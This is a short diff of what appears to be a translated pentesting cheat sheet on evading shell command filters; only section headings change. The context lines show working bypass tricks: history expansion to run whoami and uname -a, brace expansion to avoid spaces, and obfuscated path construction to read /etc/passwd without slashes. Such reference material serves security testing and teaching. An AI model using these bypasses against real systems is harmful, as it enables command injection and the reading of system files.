@@ -73,7 +73,7 @@ mi # This will throw an error
 whoa # This will throw an error
 !-1!-2 # This will execute whoami
 ```
-### Om te verbygaan verbode spasie
+### Om verbode spaties te omseil
 ```bash
 # {form}
 {cat,lol.txt} # cat lol.txt
@@ -106,7 +106,7 @@ g # These 4 lines will equal to ping
 $u $u # This will be saved in the history and can be used as a space, please notice that the $u variable is undefined
 uname!-1\-a # This equals to uname -a
 ```
-### Bypass backslash and slash
+### Bypass backslash en slash
 ```bash
 cat ${HOME:0:1}etc${HOME:0:1}passwd
 cat $(echo . | tr '!-0' '"-1')etc$(echo . | tr '!-0' '"-1')passwd
